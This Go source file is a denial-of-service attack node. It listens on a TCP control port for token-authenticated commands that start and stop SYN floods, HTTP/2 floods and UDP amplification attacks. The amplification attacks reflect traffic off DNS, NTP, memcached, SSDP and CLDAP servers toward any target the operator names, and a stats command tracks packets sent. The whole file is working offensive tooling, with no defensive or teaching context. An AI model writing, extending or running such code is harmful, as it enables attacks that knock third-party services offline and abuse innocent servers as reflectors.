package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"flood/vectors"
)

type StartCmd struct {
	Vector  string `json:"vector"`
	Target  string `json:"target"`
	Port    uint16 `json:"port"`
	Amp     string `json:"amp"`
	Workers int    `json:"workers"`
}

var (
	mu    sync.Mutex
	stops = map[string]chan struct{}{}
	stats = map[string]func() uint64{}
)

func handleStart(cmd StartCmd) string {
	mu.Lock()
	defer mu.Unlock()

	id := fmt.Sprintf("%s_%s_%d", cmd.Vector, cmd.Target, time.Now().UnixNano())
	stop := make(chan struct{})
	stops[id] = stop

	switch cmd.Vector {
	case "syn":
		f, err := vectors.NewSYNFlooder(cmd.Target, cmd.Port)
		if err != nil {
			return "err: " + err.Error()
		}
		go f.Run(stop)
		stats[id] = f.Sent
	case "udp":
		var at vectors.AmpType
		switch cmd.Amp {
		case "dns":
			at = vectors.AmpDNS
		case "ntp":
			at = vectors.AmpNTP
		case "memcached":
			at = vectors.AmpMemcached
		case "ssdp":
			at = vectors.AmpSSDP
		case "cldap":
			at = vectors.AmpCLDAP
		}
		f := vectors.NewUDPAmplifier(at, cmd.Target, cmd.Port)
		w := cmd.Workers
		if w == 0 {
			w = 64
		}
		go f.Run(stop, w)
		stats[id] = f.Packets
	case "http2":
		f := vectors.NewHTTP2Flooder("https://"+cmd.Target, cmd.Workers)
		go f.Run(stop)
		stats[id] = f.Sent
	default:
		return "err: unknown vector"
	}
	return id
}

func handleStop(id string) {
	mu.Lock()
	defer mu.Unlock()
	if ch, ok := stops[id]; ok {
		close(ch)
		delete(stops, id)
		delete(stats, id)
	}
}

func handleStats() map[string]uint64 {
	mu.Lock()
	defer mu.Unlock()
	out := make(map[string]uint64, len(stats))
	for id, fn := range stats {
		out[id] = fn()
	}
	return out
}

func main() {
	listen := flag.String("listen", ":9999", "control listen addr")
	token := flag.String("token", "", "shared auth token")
	flag.Parse()

	if *token == "" {
		*token = os.Getenv("FLOOD_TOKEN")
	}

	l, err := net.Listen("tcp", *listen)
	if err != nil {
		log.Fatal(err)
	}
	log.Printf("node listening on %s", *listen)

	for {
		c, err := l.Accept()
		if err != nil {
			continue
		}
		go serve(c, *token)
	}
}

func serve(c net.Conn, token string) {
	defer c.Close()
	sc := bufio.NewScanner(c)
	w := bufio.NewWriter(c)
	defer w.Flush()

	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		parts := strings.SplitN(line, " ", 3)
		if len(parts) < 2 || parts[0] != token {
			fmt.Fprintln(w, "err auth")
			w.Flush()
			continue
		}
		switch parts[1] {
		case "start":
			var cmd StartCmd
			if len(parts) < 3 || json.Unmarshal([]byte(parts[2]), &cmd) != nil {
				fmt.Fprintln(w, "err json")
				break
			}
			fmt.Fprintln(w, "ok "+handleStart(cmd))
		case "stop":
			if len(parts) >= 3 {
				handleStop(parts[2])
			}
			fmt.Fprintln(w, "ok")
		case "stats":
			b, _ := json.Marshal(handleStats())
			fmt.Fprintln(w, string(b))
		case "ping":
			fmt.Fprintln(w, "pong "+strconv.FormatInt(time.Now().Unix(), 10))
		}
		w.Flush()
	}
}
